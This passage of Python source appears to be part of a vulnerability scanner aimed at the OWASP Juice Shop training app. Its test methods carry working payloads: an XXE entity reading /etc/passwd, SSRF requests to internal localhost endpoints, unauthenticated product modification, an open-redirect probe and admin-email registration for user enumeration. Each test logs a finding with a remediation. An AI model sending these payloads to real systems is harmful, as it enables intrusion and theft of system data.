            # Attempt XML upload (XXE vector) to complaint endpoint
            xml_payload = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<complaint><text>&xxe;</text></complaint>'
            )
            resp = self.http_client.post(
                f"{target}/file-upload",
                headers=headers,
                data=xml_payload,
                timeout=10,
            )
            # Accept 200 or specific error that reveals upload processing
            if resp.status_code in (200, 204):
                self.add_finding(
                    title="File Upload Accepts Dangerous File Types",
                    severity=Severity.HIGH,
                    description="File upload endpoint accepts potentially dangerous file types.",
                    recommendation="Validate file types and content server-side.",
                    evidence=f"POST /file-upload returned {resp.status_code}.",
                    url=f"{target}/file-upload",
                    cwe="CWE-434",
                )
                return True
        except Exception:
            pass
        return False

    # ── SSRF ────────────────────────────────────────────────────────

    def _test_ssrf_profile_image(self, target: str) -> bool:
        """Test SSRF via profile image URL."""
        if not self._auth_token:
            return False
        ssrf_urls = [
            "http://localhost:3000/api/Users",
            "http://127.0.0.1:3000/metrics",
            "http://[::1]:3000/api/Users",
        ]
        for ssrf_url in ssrf_urls:
            try:
                resp = self.http_client.post(
                    f"{target}/profile/image/url",
                    json={"imageUrl": ssrf_url},
                    headers=self._auth_headers(),
                    timeout=10,
                )
                if resp.status_code == 200 and (
                    "data" in resp.text or "Users" in resp.text
                ):
                    self.add_finding(
                        title="SSRF via Profile Image URL",
                        severity=Severity.HIGH,
                        description=(
                            f"Profile image URL accepts internal URLs. "
                            f"SSRF payload: {ssrf_url}"
                        ),
                        recommendation="Validate and whitelist URLs. Block internal IP ranges.",
                        evidence=(
                            f"POST /profile/image/url with imageUrl={ssrf_url}\n"
                            f"Status: {resp.status_code}\n"
                            f"Response: {resp.text[:300]}"
                        ),
                        url=f"{target}/profile/image/url",
                        cwe="CWE-918",
                    )
                    return True
            except Exception:
                continue
        return False

    # ── Miscellaneous ───────────────────────────────────────────────

    def _test_user_data_exposure(self, target: str) -> bool:
        """Test for user data exposure in product reviews."""
        try:
            resp = self.http_client.get(
                f"{target}/rest/products/1/reviews", timeout=5,
            )
            if resp.status_code == 200:
                data = json.loads(resp.text) if resp.text else {}
                reviews = data.get("data", data) if isinstance(data, dict) else data
                if isinstance(reviews, list) and reviews:
                    for review in reviews:
                        author = review.get("author", "")
                        if "@" in str(author):
                            self.add_finding(
                                title="User Email Addresses Exposed in Product Reviews",
                                severity=Severity.MEDIUM,
                                description="Product reviews expose user email addresses.",
                                recommendation="Use display names instead of email addresses.",
                                evidence=f"GET /rest/products/1/reviews exposes: {author}",
                                url=f"{target}/rest/products/1/reviews",
                                cwe="CWE-200",
                            )
                            return True
        except Exception:
            pass
        return False

    def _test_product_tampering(self, target: str) -> bool:
        """Test if products can be modified without auth."""
        try:
            resp = self.http_client.get(f"{target}/api/Products/1", timeout=5)
            if resp.status_code == 200:
                put_resp = self.http_client.put(
                    f"{target}/api/Products/1",
                    json={"description": "test_tampering"},
                    headers={"Content-Type": "application/json"},
                    timeout=5,
                )
                if put_resp.status_code == 200:
                    self.add_finding(
                        title="Product Tampering — Unauthenticated Product Modification",
                        severity=Severity.HIGH,
                        description="Products can be modified without authentication.",
                        recommendation="Require admin authentication for product modifications.",
                        evidence="PUT /api/Products/1 returned 200 without auth.",
                        url=f"{target}/api/Products/1",
                        cwe="CWE-284",
                    )
                    return True
        except Exception:
            pass
        return False

    def _test_redirect(self, target: str) -> bool:
        """Test for open redirects."""
        try:
            resp = self.http_client.get(
                f"{target}/redirect?to=https://blockchain.info/address/"
                f"1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm",
                timeout=5,
                allow_redirects=False,
            )
            if resp.status_code in (301, 302):
                self.add_finding(
                    title="Open Redirect via Allowlisted URLs",
                    severity=Severity.LOW,
                    description="Redirect endpoint redirects to external URLs.",
                    recommendation="Remove or restrict redirect functionality.",
                    evidence=f"GET /redirect?to=... returned {resp.status_code}.",
                    url=f"{target}/redirect",
                    cwe="CWE-601",
                )
                return True
        except Exception:
            pass
        return False

    def _test_register_admin_dupe(self, target: str) -> bool:
        """Test registration with existing admin email."""
        try:
            resp = self.http_client.post(
                f"{target}/api/Users",
                json={
                    "email": "admin@juice-sh.op",
                    "password": "admin123456",
                    "passwordRepeat": "admin123456",
                    "securityQuestion": {
                        "id": 1,
                        "question": "Your eldest siblings middle name?",
                        "createdAt": "2024-01-01T00:00:00.000Z",
                        "updatedAt": "2024-01-01T00:00:00.000Z",
                    },
                    "securityAnswer": "test",
                },
                headers={"Content-Type": "application/json"},
                timeout=10,
            )
            data = json.loads(resp.text) if resp.text else {}
            # If we get a detailed error about duplicate, that leaks info
            if resp.status_code == 400 and "already" in resp.text.lower():
                self.add_finding(
                    title="User Enumeration via Registration",
                    severity=Severity.LOW,
                    description=(
                        "Registration endpoint reveals that admin@juice-sh.op already exists, "
                        "enabling user enumeration."
                    ),
                    recommendation="Use generic error messages for registration failures.",
                    evidence=f"POST /api/Users with admin email: {resp.text[:300]}",
                    url=f"{target}/api/Users",
                    cwe="CWE-203",
                )
                return True
            # If registration actually succeeds, that is a bigger problem
            if resp.status_code in (200, 201):
                self.add_finding(
                    title="Duplicate Admin Registration Allowed",
                    severity=Severity.HIGH,
                    description="A new account with the admin email was created successfully.",
                    recommendation="Enforce unique email constraint with proper error handling.",
                    evidence=f"POST /api/Users with admin@juice-sh.op returned {resp.status_code}.",
                    url=f"{target}/api/Users",
                    cwe="CWE-284",
                )
                return True
        except Exception:
            pass
        return False

    def _test_deprecated_interface(self, target: str) -> bool:
        """Test for deprecated B2B interface (XML upload)."""
        try:
            # Juice Shop has a B2B order XML endpoint
            resp = self.http_client.get(f"{target}/api-docs", timeout=5)
            if resp.status_code == 200 and len(resp.text) > 50:
                # Check if /b2b/v2/orders is documented or accessible
                order_resp = self.http_client.post(
                    f"{target}/b2b/v2/orders",
                    headers={
                        "Content-Type": "application/xml",
                        **({
                            "Authorization": f"Bearer {self._auth_token}"
                        } if self._auth_token else {}),
                    },
                    data=(
                        '<?xml version="1.0" encoding="UTF-8"?>'
                        "<order><productId>1</productId><quantity>1</quantity></order>"
                    ),
                    timeout=10,
                )
                if order_resp.status_code in (200, 201, 400, 500):
                    # If endpoint exists (not 404), it is a finding
                    if order_resp.status_code != 404:
                        self.add_finding(
                            title="Deprecated B2B XML Interface Accessible",
                            severity=Severity.MEDIUM,
                            description=(
                                "Deprecated B2B order interface accepts XML input, "
                                "potentially vulnerable to XXE injection."
                            ),
                            recommendation="Remove deprecated interfaces from production.",
                            evidence=(
                                f"POST /b2b/v2/orders returned {order_resp.status_code}\n"
                                f"Response: {order_resp.text[:200]}"
                            ),
                            url=f"{target}/b2b/v2/orders",
                            cwe="CWE-611",
                        )
                        return True
        except Exception:
            pass
        return False
